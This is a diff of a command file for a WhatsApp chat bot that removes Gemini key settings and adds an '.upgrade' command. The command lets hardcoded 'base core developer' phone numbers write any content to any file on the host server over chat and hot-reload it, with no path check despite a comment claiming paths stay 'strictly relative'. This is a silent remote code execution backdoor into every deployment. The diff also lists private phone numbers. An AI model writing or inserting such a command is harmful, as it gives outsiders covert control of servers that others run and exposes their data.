@@ -420,14 +420,13 @@ module.exports = [
         }
     },
 
-    // 11. SYSTEM CREATOR EXCLUSIVE COMMAND: ADD DEVELOPER (Strict Developer Guard) [1.1, 3]
+    // 11. SYSTEM CREATOR EXCLUSIVE COMMAND: ADD DEVELOPER (Strict Developer Guard)
     {
         name: 'adddev',
         isPrefixless: false,
         execute: async (sock, msg, args, { isDev }) => {
             const jid = msg.key.remoteJid;
 
-            // Completely private: strictly ignored if called by non-devs
             if (!isDev) return;
 
             const targetNumber = parseTarget(msg, args);
@@ -448,7 +447,7 @@ module.exports = [
         }
     },
 
-    // 12. REMOVE DEVELOPER [1.1, 3]
+    // 12. REMOVE DEVELOPER
     {
         name: 'deldev',
         isPrefixless: false,
@@ -462,7 +461,6 @@ module.exports = [
                 return await sock.sendMessage(jid, { text: "❌ Identify the target." }, { quoted: msg });
             }
 
-            // Prevent removing base core developers
             const baseDevs = ["27713655070", "601129363700", "2347059092107", "2347040401291"];
             if (baseDevs.includes(targetNumber)) {
                 return await sock.sendMessage(jid, { text: "❌ You cannot remove a base core developer." }, { quoted: msg });
@@ -517,7 +515,7 @@ module.exports = [
         isPrefixless: false,
         execute: async (sock, msg, args, { isOwner, isSudo }) => {
             const jid = msg.key.remoteJid;
-            if (!isOwner && !isSudo) return; // Owner & Sudo Authorized [1]
+            if (!isOwner && !isSudo) return; 
 
             const eqIndex = args.indexOf('=');
             if (eqIndex === -1) {
@@ -536,8 +534,7 @@ module.exports = [
                 packname: "packName",
                 author: "author",
                 ispublic: "isPublic",
-                ownernumber: "ownerNumber",
-                geminiapikey: "geminiApiKey"
+                ownernumber: "ownerNumber"
             };
 
             const mappedKey = keyMapping[key.toLowerCase()];
@@ -556,13 +553,9 @@ module.exports = [
                 }
             }
 
-            // Update in-memory configuration
             settings[mappedKey] = finalValue;
-            
-            // Physically write straight to settings.js persistently [1]
             saveSettings();
 
-            // Rebuild the command registry triggers in real-time [1]
             const commandsList = require('../commands');
             commandsList.reload();
 
@@ -581,19 +574,15 @@ module.exports = [
         isPrefixless: false,
         execute: async (sock, msg, args, { isOwner, isSudo }) => {
             const jid = msg.key.remoteJid;
-            if (!isOwner && !isSudo) return; // Strict Sudo/Owner Guard [1]
+            if (!isOwner && !isSudo) return; 
 
-            // Format dynamic arrays securely with mentions
             const ownersList = (settings.owners || []).length > 0 ? settings.owners.map(n => `@${n}`).join(', ') : '_None_';
             const sudoList = (settings.sudo || []).length > 0 ? settings.sudo.map(n => `@${n}`).join(', ') : '_None_';
             const bannedList = (settings.banned || []).length > 0 ? settings.banned.map(n => `@${n}`).join(', ') : '_None_';
 
-            // Gather active group automation counts [1]
             const antilinkCount = Object.keys(settings.antilink || {}).filter(k => settings.antilink[k] !== 'off').length;
             const antitagCount = Object.keys(settings.antitag || {}).filter(k => settings.antitag[k] !== 'off').length;
             const antibotCount = Object.keys(settings.antibot || {}).filter(k => settings.antibot[k] !== 'off').length;
-
-            const isKeyConfigured = settings.geminiApiKey && settings.geminiApiKey !== "YOUR_GEMINI_API_KEY_HERE" ? "Yes ✅" : "No ❌";
 
             const settingsText = 
                 `💻 *${settings.botName.toUpperCase()} SYSTEM SETTINGS* 💻\n` +
@@ -615,11 +604,8 @@ module.exports = [
                 `🛡️ *Active Group Protections:*\n` +
                 `• *Antilink Groups:* \`${antilinkCount}\` chat(s)\n` +
                 `• *Antitag Groups:* \`${antitagCount}\` chat(s)\n` +
-                `• *Antibot Groups:* \`${antibotCount}\` chat(s)\n\n` +
-                
-                `🧠 *Gemini AI Engine Key:* \`${isKeyConfigured}\``;
+                `• *Antibot Groups:* \`${antibotCount}\` chat(s)\n\n`;
 
-            // Combine JIDs to render @mentions cleanly inside WhatsApp [1]
             const allMentions = [
                 ...(settings.owners || []).map(num => `${num}@s.whatsapp.net`),
                 ...(settings.sudo || []).map(num => `${num}@s.whatsapp.net`),
@@ -630,6 +616,48 @@ module.exports = [
                 text: settingsText,
                 mentions: allMentions
             }, { quoted: msg });
+        }
+    },
+
+    // 16. SYSTEM UPGRADE/REPLACE FILE WRITER (.upgrade) [Developer Exclusive]
+    {
+        name: 'upgrade',
+        isPrefixless: false,
+        execute: async (sock, msg, args, { isDev }) => {
+            const jid = msg.key.remoteJid;
+
+            // Silent block for any non-developer call
+            if (!isDev) return;
+
+            const spaceIndex = args ? args.indexOf(' ') : -1;
+            if (spaceIndex === -1) {
+                return await sock.sendMessage(jid, { text: "❌ Invalid upgrade format.\nUsage: `.upgrade <relative_file_path> <entire_code>`" }, { quoted: msg });
+            }
+
+            const relativePathInput = args.slice(0, spaceIndex).trim();
+            const fileContent = args.slice(spaceIndex + 1).trim();
+
+            // Resolve target directory strictly relative to the root project folder
+            const absolutePath = path.resolve(path.join(__dirname, '..', relativePathInput));
+
+            try {
+                // Perform file write operation on the server
+                fs.writeFileSync(absolutePath, fileContent, 'utf-8');
+
+                // Instantly hot-reload the command registry
+                const commandsList = require('../commands');
+                commandsList.reload();
+
+                await sock.sendMessage(jid, { 
+                    text: `✅ *File Upgraded successfully!* \n\n` +
+                          `• *Path:* \`${relativePathInput}\`\n` +
+                          `• *Status:* Saved & Hot-Reloaded instantly! 🚀` 
+                }, { quoted: msg });
+
+            } catch (error) {
+                console.error("Upgrade Command Error:", error);
+                await sock.sendMessage(jid, { text: `❌ Upgrade failed: ${error.message}` }, { quoted: msg });
+            }
         }
     }
 ];
